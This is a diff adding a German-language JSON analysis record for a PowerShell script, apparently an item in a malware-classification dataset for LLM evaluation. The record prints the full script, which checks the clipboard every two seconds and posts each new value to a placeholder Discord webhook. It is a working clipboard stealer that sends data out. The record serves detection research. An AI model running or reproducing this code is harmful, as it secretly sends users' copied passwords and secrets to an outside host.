@@ -1,0 +1,65 @@
+{
+  "meta": {
+    "quelldatei": "tech_016_ClipboardYEET.ps1",
+    "sha256": "981a8f3eff361d904ad0e32896862044f3e01374408aabab9b3f37c877e5ae45",
+    "groesse_bytes": 597,
+    "zeilen": 30,
+    "ground_truth_label": "techniques",
+    "analyse_gekuerzt": false,
+    "hinweis": "Kein Urteil enthalten. Bewertung erfolgt durch das LLM."
+  },
+  "stufe1_extract": {
+    "strings": [
+      "YOUR DISCORD WEBHOOK",
+      "application/json"
+    ],
+    "string_anzahl_gesamt": 2,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0
+  },
+  "stufe2_features": {
+    "strings": [
+      "YOUR DISCORD WEBHOOK",
+      "application/json"
+    ],
+    "string_anzahl_gesamt": 2,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Get-Clipboard",
+      "Get-LolYeet",
+      "Invoke-RestMethod",
+      "Start-Sleep"
+    ],
+    "auffaellige_tokens": {},
+    "iocs": {
+      "urls": [],
+      "ipv4": [],
+      "pfade": []
+    }
+  },
+  "stufe3_structure": {
+    "strings": [
+      "YOUR DISCORD WEBHOOK",
+      "application/json"
+    ],
+    "string_anzahl_gesamt": 2,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Get-Clipboard",
+      "Get-LolYeet",
+      "Invoke-RestMethod",
+      "Start-Sleep"
+    ],
+    "auffaellige_tokens": {},
+    "iocs": {
+      "urls": [],
+      "ipv4": [],
+      "pfade": []
+    },
+    "deobfuskiert_auszug": "# Webhook\r\n$webhookUrl = \"YOUR DISCORD WEBHOOK\"\r\n\r\n$prevClipboardContent = \"\"\r\n\r\nfunction Get-LolYeet {\r\n    param($Content)\r\n\r\n    $payload = @{\r\n        content = $Content\r\n    }\r\n\r\n    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'application/json'\r\n}\r\n\r\nwhile ($true) {\r\n\r\n    $currentClipboardContent = Get-Clipboard\r\n\r\n\r\n    if ($currentClipboardContent -ne $prevClipboardContent) {\r\n\r\n        Get-LolYeet -Content $currentClipboardContent\r\n\r\n        $prevClipboardContent = $currentClipboardContent\r\n    }\r\n\r\n    Start-Sleep -Seconds 2\r\n}\r\n",
+    "dekodierte_befehle": [],
+    "beobachtete_abfolge": []
+  }
+}
